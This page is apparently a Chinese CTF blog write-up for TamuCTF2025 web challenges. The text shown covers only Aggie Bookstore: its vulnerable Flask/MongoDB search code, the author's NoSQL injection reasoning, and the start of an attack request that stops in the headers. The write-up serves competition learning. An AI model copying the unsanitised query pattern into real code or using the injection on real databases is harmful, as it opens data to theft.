<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="奇奇怪怪的"><title>TamuCTF2025(web全)</title><link rel=canonical href=https://baozongwi.xyz/p/tamuctf2025-web-all/><link rel=stylesheet href=/scss/style.min.0fd9f1efab870423165ae7588bc203f4d3a9f9422c89352ef010f8c63e7225f0.css><meta property='og:title' content="TamuCTF2025(web全)"><meta property='og:description' content="奇奇怪怪的"><meta property='og:url' content='https://baozongwi.xyz/p/tamuctf2025-web-all/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Nosql'><meta property='article:published_time' content='2025-03-29T09:31:22+00:00'><meta property='article:modified_time' content='2025-03-29T09:31:22+00:00'><meta name=twitter:title content="TamuCTF2025(web全)"><meta name=twitter:description content="奇奇怪怪的"><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1></div></header><ol class=menu-social><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=https://discord.com/users/1276595362970337414 target=_blank title=discord rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-discord"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M14 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M15.5 17c0 1 1.5 3 2 3 1.5.0 2.833-1.667 3.5-3 .667-1.667.5-5.833-1.5-11.5-1.457-1.015-3-1.34-4.5-1.5l-.972 1.923a11.913 11.913.0 00-4.053.0L9 4c-1.5.16-3.043.485-4.5 1.5-2 5.667-2.167 9.833-1.5 11.5.667 1.333 2 3 3.5 3 .5.0 2-2 2-3"/><path d="M7 16.5c3.5 1 6.5 1 10 0"/></svg></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k target=_blank title=travel rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-map-pin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 11a3 3 0 106 0 3 3 0 00-6 0"/><path d="M17.657 16.657 13.414 20.9a2 2 0 01-2.827.0l-4.244-4.243a8 8 0 1111.314.0z"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://www.travellings.cn/go.html target=_blank title=Travelling rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width=".5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tram-front-icon lucide-tram-front"><rect width="16" height="16" x="4" y="3" rx="2"/><path d="M4 11h16"/><path d="M12 3v8"/><path d="m8 19-2 3"/><path d="m18 22-2-3"/><path d="M8 15h.01"/><path d="M16 15h.01"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#aggie-bookstore160-solves>Aggie Bookstore(160 solves)</a></li><li><a href=#impossible108-solves>Impossible(108 solves)</a></li><li><a href=#transparency99-solves>Transparency(99 solves)</a></li><li><a href=#research7-solves>Research(7 solves)</a></li><li><a href=#modern-banking7-solves>Modern Banking(7 solves)</a></li><li><a href=#forward-to-the-past53-solves>Forward to the Past(53 solves)</a></li><li><a href=#moving-slowly84-solves>Moving Slowly(84 solves)</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E8%B5%9B%E9%A2%98/>赛题</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/tamuctf2025-web-all/>TamuCTF2025(web全)</a></h2><h3 class=article-subtitle>奇奇怪怪的</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published datetime=2025-03-29T09:31:22Z>Mar 29, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>12 minute read</time></div></footer></div></header><section class=article-content><div class=outdated-notice><span class=outdated-notice__icon><svg class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg>
</span><span>友情提示：本文最后更新于 320 天前，文中的内容可能已有所发展或发生改变。</span></div><p>首发于先知社区 <a class=link href=https://xz.aliyun.com/news/17519 target=_blank rel=noopener>https://xz.aliyun.com/news/17519</a></p><h2 id=aggie-bookstore160-solves>Aggie Bookstore(160 solves)</h2><p>这里的代码，对于我这个AI小子来说非常难看，但是看代码我们就不着急，慢慢一句一句的搞懂</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>render_template</span><span class=p>,</span> <span class=n>jsonify</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pymongo</span> <span class=kn>import</span> <span class=n>MongoClient</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>client</span> <span class=o>=</span> <span class=n>MongoClient</span><span class=p>(</span><span class=s2>&#34;mongodb://localhost:27017/&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>db</span> <span class=o>=</span> <span class=n>client</span><span class=p>[</span><span class=s1>&#39;aggie_bookstore&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>books_collection</span> <span class=o>=</span> <span class=n>db</span><span class=p>[</span><span class=s1>&#39;books&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>sanitize</span><span class=p>(</span><span class=n>input_str</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>re</span><span class=o>.</span><span class=n>sub</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;[^a-zA-Z0-9\s]&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=n>input_str</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;index.html&#39;</span><span class=p>,</span> <span class=n>books</span><span class=o>=</span><span class=kc>None</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/search&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>search</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>query</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;$and&#34;</span><span class=p>:</span> <span class=p>[]}</span>
</span></span><span class=line><span class=cl>    <span class=n>books</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>method</span> <span class=o>==</span> <span class=s1>&#39;GET&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>title</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;title&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>author</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;author&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>title_clean</span> <span class=o>=</span> <span class=n>sanitize</span><span class=p>(</span><span class=n>title</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>author_clean</span> <span class=o>=</span> <span class=n>sanitize</span><span class=p>(</span><span class=n>author</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>title_clean</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>query</span><span class=p>[</span><span class=s2>&#34;$and&#34;</span><span class=p>]</span><span class=o>.</span><span class=n>append</span><span class=p>({</span><span class=s2>&#34;title&#34;</span><span class=p>:</span> <span class=p>{</span><span class=s2>&#34;$eq&#34;</span><span class=p>:</span> <span class=n>title_clean</span><span class=p>}})</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>author_clean</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>query</span><span class=p>[</span><span class=s2>&#34;$and&#34;</span><span class=p>]</span><span class=o>.</span><span class=n>append</span><span class=p>({</span><span class=s2>&#34;author&#34;</span><span class=p>:</span> <span class=p>{</span><span class=s2>&#34;$eq&#34;</span><span class=p>:</span> <span class=n>author_clean</span><span class=p>}})</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>query</span><span class=p>[</span><span class=s2>&#34;$and&#34;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>            <span class=n>books</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>books_collection</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=n>query</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;index.html&#39;</span><span class=p>,</span> <span class=n>books</span><span class=o>=</span><span class=n>books</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>request</span><span class=o>.</span><span class=n>method</span> <span class=o>==</span> <span class=s1>&#39;POST&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>content_type</span> <span class=o>==</span> <span class=s1>&#39;application/json&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>data</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>get_json</span><span class=p>(</span><span class=n>force</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>title</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;title&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>author</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;author&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>title</span><span class=p>,</span> <span class=nb>str</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                    <span class=n>title</span> <span class=o>=</span> <span class=n>sanitize</span><span class=p>(</span><span class=n>title</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=n>query</span><span class=p>[</span><span class=s2>&#34;$and&#34;</span><span class=p>]</span><span class=o>.</span><span class=n>append</span><span class=p>({</span><span class=s2>&#34;title&#34;</span><span class=p>:</span> <span class=n>title</span><span class=p>})</span>
</span></span><span class=line><span class=cl>                <span class=k>elif</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>title</span><span class=p>,</span> <span class=nb>dict</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                    <span class=n>query</span><span class=p>[</span><span class=s2>&#34;$and&#34;</span><span class=p>]</span><span class=o>.</span><span class=n>append</span><span class=p>({</span><span class=s2>&#34;title&#34;</span><span class=p>:</span> <span class=n>title</span><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>author</span><span class=p>,</span> <span class=nb>str</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                    <span class=n>author</span> <span class=o>=</span> <span class=n>sanitize</span><span class=p>(</span><span class=n>author</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=n>query</span><span class=p>[</span><span class=s2>&#34;$and&#34;</span><span class=p>]</span><span class=o>.</span><span class=n>append</span><span class=p>({</span><span class=s2>&#34;author&#34;</span><span class=p>:</span> <span class=n>author</span><span class=p>})</span>
</span></span><span class=line><span class=cl>                <span class=k>elif</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>author</span><span class=p>,</span> <span class=nb>dict</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                    <span class=n>query</span><span class=p>[</span><span class=s2>&#34;$and&#34;</span><span class=p>]</span><span class=o>.</span><span class=n>append</span><span class=p>({</span><span class=s2>&#34;author&#34;</span><span class=p>:</span> <span class=n>author</span><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>query</span><span class=p>[</span><span class=s2>&#34;$and&#34;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>                    <span class=n>books</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>books_collection</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=n>query</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=n>jsonify</span><span class=p>([</span>
</span></span><span class=line><span class=cl>                        <span class=p>{</span><span class=s2>&#34;title&#34;</span><span class=p>:</span> <span class=n>b</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;title&#34;</span><span class=p>),</span> <span class=s2>&#34;author&#34;</span><span class=p>:</span> <span class=n>b</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;author&#34;</span><span class=p>)}</span> <span class=k>for</span> <span class=n>b</span> <span class=ow>in</span> <span class=n>books</span>
</span></span><span class=line><span class=cl>                    <span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s2>&#34;error&#34;</span><span class=p>:</span> <span class=s2>&#34;Empty query&#34;</span><span class=p>}),</span> <span class=mi>400</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s2>&#34;error&#34;</span><span class=p>:</span> <span class=nb>str</span><span class=p>(</span><span class=n>e</span><span class=p>)}),</span> <span class=mi>500</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s2>&#34;error&#34;</span><span class=p>:</span> <span class=s2>&#34;Unsupported Content-Type&#34;</span><span class=p>}),</span> <span class=mi>400</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=s2>&#34;0.0.0.0&#34;</span><span class=p>,</span> <span class=mi>8000</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>首先看到是<code>mongodb</code>，并且过滤函数<code>sanitize</code>，过滤特殊字符，仅保留字母、数字、空格，<code>/index</code>什么东西都没有<code>/search</code>是一个数据库的查询，<code>$and</code> 是 MongoDB 的操作符，表示 <strong>同时满足所有条件</strong>（类似 SQL 的 <code>AND</code>），在<code>/search</code>的GET传参把所有的特殊字符过滤了，所以除了Unicode啥的基本不考虑了，不过这个路由开了POST，并且解析json，<code>$eq</code> 是 MongoDB 的等于”操作符（类似 SQL 的 <code>=</code>）。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>if</span> <span class=n>query</span><span class=p>[</span><span class=s2>&#34;$and&#34;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>    <span class=n>books</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>books_collection</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=n>query</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>books</span> <span class=o>=</span> <span class=p>[]</span> 
</span></span></code></pre></td></tr></table></div></div><p>进行查询，看完代码之后很明显的Nosql注入，冲</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/search</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>aggie-bookstore.tamuctf.com</span>
</span></span><span class=line><span class=cl><span class=n>Pragma</span><span class=o>:</span> <span class=l>no-cache</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>no-cache</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Ch-Ua</span><span class=o>:</span> <span class=l>&#34;Chromium&#34;;v=&#34;134&#34;, &#34;Not:A-Brand&#34;;v=&#34;24&#34;, &#34;Google Chrome&#34;;v=&#34;134&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Ch-Ua-Mobile</span><span class=o>:</span> <span class=l>?0</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Ch-Ua-Platform</span><span class=o>:</span> <span class=l>&#34;Windows&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Site</span><span class=o>:</span> <span class=l>same-origin</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Mode</span><span class=o>:</span> <span class=l>navigate</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Dest</span><span class=o>:</span> <span class=l>document</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-User</span><span class=o>:</span> <span class=l>?1</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>https://aggie-bookstore.tamuctf.com/search?title=test&amp;author=test</span>
